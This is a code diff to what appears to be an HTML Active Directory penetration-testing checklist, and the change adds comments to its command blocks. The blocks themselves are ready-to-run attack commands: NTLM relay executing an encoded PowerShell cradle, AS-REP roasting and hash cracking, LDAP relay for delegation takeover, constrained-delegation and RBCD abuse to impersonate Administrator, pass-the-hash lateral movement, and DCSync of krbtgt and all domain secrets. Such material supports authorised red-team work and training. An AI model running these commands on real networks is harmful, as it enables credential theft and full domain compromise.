@@ -8010,7 +8010,8 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
   </li>
   <li>
     <label><input type="checkbox"> Launch ntlmrelayx targeting the relay host with the encoded cradle</label>
-    <pre><code class="language-bash">sudo impacket-ntlmrelayx --no-http-server -smb2support \
+    <pre><code class="language-bash"># Relay to one SMB target and execute the encoded cradle
+sudo impacket-ntlmrelayx --no-http-server -smb2support \
   -t [relay-target] \
   -c 'powershell -enc [base64-cradle]'
 
@@ -9047,8 +9048,13 @@ klist</code></pre>
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
   <li><label><input type="checkbox"> Enumerate and request AS-REP hashes from Kali</label>
-    <pre><code class="language-bash">impacket-GetNPUsers [domain]/ -dc-ip [dc-ip] -usersfile users.txt -format hashcat -outputfile asrep.hashes
+    <pre><code class="language-bash"># Unauthenticated user list mode: test names from users.txt for pre-auth disabled accounts
+impacket-GetNPUsers [domain]/ -dc-ip [dc-ip] -usersfile users.txt -format hashcat -outputfile asrep.hashes
+
+# Authenticated domain query mode: use valid credentials to find and request roastable AS-REP hashes
 impacket-GetNPUsers [domain]/[user]:'[password]' -dc-ip [dc-ip] -request -format hashcat -outputfile asrep.hashes
+
+# Crack the collected AS-REP hashes offline
 hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -r rules/best64.rule</code></pre>
   </li>
   <li><label><input type="checkbox"> Enumerate and roast from Windows</label>
@@ -9093,8 +9099,13 @@ hashcat -m 5600 netntlmv2.hashes /usr/share/wordlists/rockyou.txt</code></pre>
     <pre><code class="language-bash">nxc smb [subnet]/24 -u [user] -p '[password]' --gen-relay-list relay-targets.txt</code></pre>
   </li>
   <li><label><input type="checkbox"> Relay SMB authentication to SMB or LDAP</label>
-    <pre><code class="language-bash">impacket-ntlmrelayx -tf relay-targets.txt -smb2support
+    <pre><code class="language-bash"># Relay captured NTLM to SMB targets from a generated target file
+impacket-ntlmrelayx -tf relay-targets.txt -smb2support
+
+# Relay to LDAP and create resource-based constrained delegation for computer-account takeover
 impacket-ntlmrelayx -t ldap://[dc-ip] --delegate-access -smb2support
+
+# Relay to LDAPS and grant escalation rights to a controlled user
 impacket-ntlmrelayx -t ldaps://[dc-ip] --escalate-user [user] -smb2support</code></pre>
   </li>
   <li><label><input type="checkbox"> Coerce authentication when allowed by scope</label>
@@ -9179,12 +9190,20 @@ Get-DomainComputer -Properties msds-allowedtoactonbehalfofotheridentity</code></
   <li><label><input type="checkbox"> Abuse constrained delegation from Windows or Kali</label>
     <pre><code class="language-powershell">.\Rubeus.exe hash /password:[password]
 .\Rubeus.exe s4u /user:[svc] /rc4:[ntlm] /impersonateuser:administrator /msdsspn:cifs/[target].[domain] /ptt</code></pre>
-    <pre><code class="language-bash">impacket-getST -spn cifs/[target].[domain] -impersonate Administrator [domain]/[svc]:'[password]' -dc-ip [dc-ip]
+    <pre><code class="language-bash"># Request a delegated service ticket while impersonating Administrator
+impacket-getST -spn cifs/[target].[domain] -impersonate Administrator [domain]/[svc]:'[password]' -dc-ip [dc-ip]
+
+# Use the resulting ccache for Kerberos-authenticated remote execution
 KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass [target].[domain]</code></pre>
   </li>
   <li><label><input type="checkbox"> Abuse RBCD when you can write the target computer object</label>
-    <pre><code class="language-bash">impacket-addcomputer [domain]/[user]:'[password]' -computer-name '[controlled]$' -computer-pass '[computer-pass]' -dc-ip [dc-ip]
+    <pre><code class="language-bash"># Create a controlled computer account for the RBCD primitive
+impacket-addcomputer [domain]/[user]:'[password]' -computer-name '[controlled]$' -computer-pass '[computer-pass]' -dc-ip [dc-ip]
+
+# Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
 python3 rbcd.py -delegate-from '[controlled]$' -delegate-to '[target]$' -dc-ip [dc-ip] -action write [domain]/[user]:'[password]'
+
+# Request a service ticket to the target as Administrator using the controlled computer account
 impacket-getST -spn cifs/[target].[domain] -impersonate Administrator [domain]/'[controlled]$':'[computer-pass]' -dc-ip [dc-ip]</code></pre>
   </li>
 </ul>
@@ -9195,14 +9214,26 @@ impacket-getST -spn cifs/[target].[domain] -impersonate Administrator [domain]/'
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
   <li><label><input type="checkbox"> Test credentials and local admin rights at scale</label>
-    <pre><code class="language-bash">nxc smb [subnet]/24 -u [user] -p '[password]' --local-auth
+    <pre><code class="language-bash"># Test the credential as a local account on each host
+nxc smb [subnet]/24 -u [user] -p '[password]' --local-auth
+
+# Test the credential as a domain account over SMB
 nxc smb [subnet]/24 -d [domain] -u [user] -p '[password]'
+
+# Test the credential for WinRM access
 nxc winrm [subnet]/24 -d [domain] -u [user] -p '[password]'</code></pre>
   </li>
   <li><label><input type="checkbox"> Pass-the-hash over SMB/WinRM/WMI</label>
-    <pre><code class="language-bash">nxc smb [target] -u [user] -H [ntlm] --local-auth
+    <pre><code class="language-bash"># Check local-admin access with a local NTLM hash
+nxc smb [target] -u [user] -H [ntlm] --local-auth
+
+# Pass-the-hash via SMB service creation; noisier, often returns SYSTEM
 impacket-psexec [domain]/[user]@[target] -hashes :[ntlm]
+
+# Pass-the-hash via WMI; usually quieter and runs as the supplied user context
 impacket-wmiexec [domain]/[user]@[target] -hashes :[ntlm]
+
+# Pass-the-hash into WinRM when the target allows remote PowerShell
 evil-winrm -i [target] -u [user] -H [ntlm]</code></pre>
   </li>
   <li><label><input type="checkbox"> Overpass-the-hash to obtain a Kerberos TGT</label>
@@ -9214,7 +9245,10 @@ PsExec64.exe \\[host].[domain] cmd.exe</code></pre>
     <pre><code class="language-powershell">.\Rubeus.exe dump /nowrap
 .\Rubeus.exe ptt /ticket:[base64-ticket]
 klist</code></pre>
-    <pre><code class="language-bash">export KRB5CCNAME=[ticket].ccache
+    <pre><code class="language-bash"># Point Impacket at the Kerberos ccache
+export KRB5CCNAME=[ticket].ccache
+
+# Use Kerberos authentication instead of password/hash authentication
 impacket-psexec -k -no-pass [host].[domain]</code></pre>
   </li>
 </ul>
@@ -9227,7 +9261,10 @@ impacket-psexec -k -no-pass [host].[domain]</code></pre>
   <li><label><input type="checkbox"> DCSync a specific user or the whole domain</label>
     <pre><code class="language-powershell">.\mimikatz.exe "lsadump::dcsync /domain:[domain] /user:[domain]\krbtgt"
 .\mimikatz.exe "lsadump::dcsync /domain:[domain] /all /csv"</code></pre>
-    <pre><code class="language-bash">impacket-secretsdump [domain]/[user]:'[password]'@[dc-ip] -just-dc-user krbtgt
+    <pre><code class="language-bash"># DCSync only the krbtgt account, typically for golden-ticket material
+impacket-secretsdump [domain]/[user]:'[password]'@[dc-ip] -just-dc-user krbtgt
+
+# DCSync all domain credential material
 impacket-secretsdump [domain]/[user]:'[password]'@[dc-ip] -just-dc</code></pre>
   </li>
   <li><label><input type="checkbox"> Forge a golden ticket after obtaining krbtgt hash and domain SID</label>
